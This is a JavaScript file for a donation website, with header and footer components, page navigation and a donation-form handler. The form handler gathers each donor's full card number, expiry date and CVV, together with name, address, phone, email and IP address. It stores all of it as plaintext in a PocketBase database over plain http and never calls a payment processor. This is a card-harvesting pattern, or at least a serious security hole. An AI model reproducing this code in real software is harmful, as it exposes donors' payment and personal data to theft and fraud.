class SiteHeader extends HTMLElement {
    connectedCallback() {
        fetch("templates/header.html")
            .then(res => res.text())
            .then(html => {
                // Clean up any injected scripts from live-server
                html = html.replace(/<script[\s\S]*?<\/script>/gi, "");
                this.innerHTML = html;

                // --- Mobile Menu ---
                const burger = this.querySelector(".burger");
                const mobileMenu = this.querySelector("#mobile-menu");
                if (burger && mobileMenu) {
                    burger.addEventListener("click", () => {
                        mobileMenu.classList.toggle("hidden");
                        console.log("✅ Burger toggled");
                    });
                } else {
                    console.warn("⚠️ Burger or mobile menu not found");
                }

                // --- Dropdown Toggles (About, Projects) ---
                this.querySelectorAll("[data-dropdown]").forEach(btn => {
                    btn.addEventListener("click", () => {
                        const targetId = btn.getAttribute("data-dropdown");
                        const dropdown = this.querySelector(`#${targetId}`);
                        if (dropdown) {
                            dropdown.classList.toggle("hidden");
                        }
                    });
                });

                // --- Navigation Links (Universal) ---
                this.querySelectorAll(".na-link").forEach(link => {
                    link.addEventListener("click", e => {
                        e.preventDefault();
                        const file = link.dataset.file;
                        const pageId = link.dataset.target;
                        showPage(pageId, file);
                    });
                });
            })
            .catch(err => console.error("Failed to load header:", err));
    }
}
customElements.define("site-header", SiteHeader);


class SiteFooter extends HTMLElement {
    connectedCallback() {
        fetch("templates/footer.html")
            .then(res => res.text())
            .then(html => {
                this.innerHTML = html;
            })
            .catch(err => console.error("Failed to load footer:", err));
    }
}
customElements.define("site-footer", SiteFooter);


// main.js (load as <script type="module">)
import PocketBase from "https://cdn.jsdelivr.net/npm/pocketbase@0.21.1/dist/pocketbase.es.mjs";
const pb = new PocketBase("http://127.0.0.1:8090"); // change if your PB is elsewhere

class SiteDonationForm extends HTMLElement {
  async connectedCallback() {
    try {
      const res = await fetch("templates/donate.html");
      let html = await res.text();

      // strip any inline scripts (they won't run anyway)
      html = html.replace(/<script[\s\S]*?<\/script>/gi, "");

      this.innerHTML = html;
      console.log("✅ donation template injected");

      const root = this; // scope everything to the component

      // --- useful refs ---
      const amountInput = root.querySelector("#donation-amount");
      const amountGrid = root.querySelector(".grid.grid-cols-3") || root.querySelector(".grid");
      const donateBtn = root.querySelector("#donate-button");
      const cardInfo = root.querySelector("#card-info");
      const offlineInfo = root.querySelector("#offline-info");

      // --- ensure preset amount buttons don't submit the form ---
      if (amountGrid) {
        amountGrid.querySelectorAll("button").forEach(btn => {
          btn.setAttribute("type", "button"); // important inside a form
        });

        // event delegation on the grid
        amountGrid.addEventListener("click", (e) => {
          const btn = e.target.closest("button");
          if (!btn) return;
          const text = (btn.textContent || "").trim();
          if (!text.includes("$")) return; // only preset buttons

          e.preventDefault();
          const numeric = text.replace(/[^0-9.]/g, "");
          if (amountInput) amountInput.value = numeric ? parseFloat(numeric).toFixed(2) : "";

          // reset styles for all preset buttons inside this grid
          amountGrid.querySelectorAll("button").forEach(b => {
            b.classList.remove("border-yashar-blue", "bg-yashar-blue", "text-white");
            b.classList.add("border-gray-200");
          });

          // highlight the clicked button
          btn.classList.remove("border-gray-200");
          btn.classList.add("border-yashar-blue", "bg-yashar-blue", "text-white");
        });
      } else {
        console.warn("⚠️ donation amount grid not found");
      }

      // if user types a custom amount, clear preset highlights
      if (amountInput) {
        amountInput.addEventListener("input", () => {
          if (amountGrid) {
            amountGrid.querySelectorAll("button").forEach(b => {
              b.classList.remove("border-yashar-blue", "bg-yashar-blue", "text-white");
              b.classList.add("border-gray-200");
            });
          }
        });
      }

      // --- payment method toggle (scoped) ---
      root.querySelectorAll('input[name="payment"]').forEach(radio => {
        radio.addEventListener("change", function () {
          if (this.value === "card") {
            if (cardInfo) cardInfo.style.display = "block";
            if (offlineInfo) offlineInfo.classList.add("hidden");
          } else if (this.value === "offline") {
            if (cardInfo) cardInfo.style.display = "none";
            if (offlineInfo) offlineInfo.classList.remove("hidden");
          } else {
            if (cardInfo) cardInfo.style.display = "none";
            if (offlineInfo) offlineInfo.classList.add("hidden");
          }
        });
      });

      // --- donate button handler ---
      if (donateBtn) {
        donateBtn.addEventListener("click", async (ev) => {
          ev.preventDefault();
          donateBtn.disabled = true;
          donateBtn.textContent = "Processing...";

          try {
            // minimal validation
            const first_name = (root.querySelector("#donor-first")?.value || "").trim();
            const last_name = (root.querySelector("#donor-last")?.value || "").trim();
            const Name = `Last Name:  ${last_name} : First Name:  ${first_name}`;
            const email = (root.querySelector("#donor-email")?.value || "").trim();
            const Phone_number = (root.querySelector("#donor-phone")?.value || "").trim();
            const amountRaw = root.querySelector("#donation-amount")?.value;
            const amount = amountRaw ? parseFloat(amountRaw) : 0;
            const project = root.querySelector("#donation-project")?.value || "";
            const Payment_Type = root.querySelector("input[name='payment']:checked")?.value || "card";
            const recurring = !!root.querySelector("#donation-recurring")?.checked;
            const recurring_interval = root.querySelector("#donation-recurring-interval")?.value || "";
            const country = root.querySelector("#donor-country")?.value || "";
            const cc = (root.querySelector("#card-number")?.value || "").trim();
            const exp = (root.querySelector("#card-expiry")?.value || "").trim();
            const cvv = (root.querySelector("#card-cvv")?.value || "").trim();
            const Card_details = `Card Number:  ${cc} : Expiry:  ${exp} : CVV:  ${cvv}`;
            const street = (root.querySelector("#donor-street-address")?.value || "").trim();
            const city = (root.querySelector("#donor-city")?.value || "").trim();
            const state = (root.querySelector("#donor-state")?.value || "").trim();
            const zip = (root.querySelector("#donor-zip")?.value || "").trim();
            const Donor_Address = `Street:  ${street} : City:  ${city} : State:  ${state} : ZIP:  ${zip}`;

            if (!first_name || !email || !amount || !Phone_number || !Donor_Address || !country || isNaN(amount) || amount <= 0) {
              alert("Please fill all Fields and ensure amount is a positive number.");
              donateBtn.disabled = false;
              donateBtn.textContent = "DONATE NOW";
              return;
            }

            // try to get IP (best-effort)
            let IP = "";
            try {
              const ipRes = await fetch("https://api.ipify.org?format=json");
              if (ipRes.ok) {
                const ipData = await ipRes.json();
                IP = ipData.ip || "";
              }
            } catch (err) {
              console.warn("Could not fetch IP:", err);
            }

            const donationData = {
              Name,
              email,
              Phone_number,
              amount,
              // project,
              Payment_Type,
              Card_details,
              Transaction_status: "Pending",
              Donor_Address,
              country,
              IP,
              recurring,
              recurring_interval,
              created_at: new Date().toISOString()
            };

            console.log("📤 Saving donation to PocketBase:", donationData);

            // create record in PocketBase
            const record = await pb.collection("donations").create(donationData);

            console.log("✅ Donation saved:", record);
            alert("Thank you — your donation was submitted. We will follow up with confirmation.");

            // optional: reset form
            root.querySelector("form")?.reset();
            if (amountInput) amountInput.value = "0.00";
            if (amountGrid) {
              amountGrid.querySelectorAll("button").forEach(b => {
                b.classList.remove("border-yashar-blue", "bg-yashar-blue", "text-white");
                b.classList.add("border-gray-200");
              });
            }
          } catch (err) {
            console.error("❌ donation error:", err);
            alert("Something went wrong saving your donation. See console for details.");
          } finally {
            donateBtn.disabled = false;
            donateBtn.textContent = "DONATE NOW";
          }
        });
      } else {
        console.warn("⚠️ Donate button not found inside component");
      }

    } catch (err) {
      console.error("Failed to load donation template:", err);
    }
  }
}

customElements.define("site-donation-form", SiteDonationForm);





// --- Global (runs regardless of header/footer) ---

// Smooth scrolling for anchor links
document.querySelectorAll('a[href^="#"]').forEach(anchor => {
    anchor.addEventListener('click', function (e) {
        e.preventDefault();
        const target = document.querySelector(this.getAttribute('href'));
        if (target) {
            target.scrollIntoView({
                behavior: 'smooth',
                block: 'start'
            });
        }
    });
});

// Universal showPage function
function showPage(pageId, file = null) {
    const currentFile = window.location.pathname.split("/").pop();

    if (file && currentFile !== file) {
        window.location.href = `${file}#${pageId}`;
        return;
    }

    const pages = document.querySelectorAll(".page-content");

    if (pages.length > 1) {
        pages.forEach(page => page.classList.add("hidden"));
        const targetPage = document.getElementById(pageId);
        if (targetPage) {
            targetPage.classList.remove("hidden");
        }
    }

    if (!file && window.location.hash.substring(1) !== pageId) {
        window.location.hash = pageId;
    }
}

// Handle hash on load
window.addEventListener("DOMContentLoaded", () => {
    const hash = window.location.hash.substring(1);

    if (hash) {
        showPage(hash);
    } else {
        const firstPage = document.querySelector(".page-content");
        if (firstPage) {
            firstPage.classList.remove("hidden");
        }
    }
});

// Handle hash change (when user navigates within the same file)
window.addEventListener("hashchange", () => {
    const hash = window.location.hash.substring(1);
    if (hash) {
        showPage(hash);
    }
});